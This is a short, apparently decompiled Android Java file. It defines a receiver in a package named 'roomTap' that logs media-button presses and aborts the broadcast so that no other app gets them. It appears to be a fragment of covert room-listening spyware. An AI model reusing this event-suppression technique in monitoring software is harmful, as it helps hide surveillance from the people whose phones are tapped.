package com.network.android.roomTap;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.view.KeyEvent;
import com.network.android.c.a.a;

public class MediaPlayerIntentReciever extends BroadcastReceiver {

    /* renamed from: a  reason: collision with root package name */
    static MediaPlayerIntentReciever f112a = null;

    public void onReceive(Context context, Intent intent) {
        try {
            a.a("MediaPlayerIntentsReciever onReceive");
            if ("android.intent.action.MEDIA_BUTTON".equals(intent.getAction())) {
                a.a("MediaPlayerIntentsReciever event: " + ((KeyEvent) intent.getParcelableExtra("android.intent.extra.KEY_EVENT")));
                abortBroadcast();
            }
        } catch (Throwable th) {
            a.a("MediaPlayerIntentsReciever exception.", th);
        }
    }
}
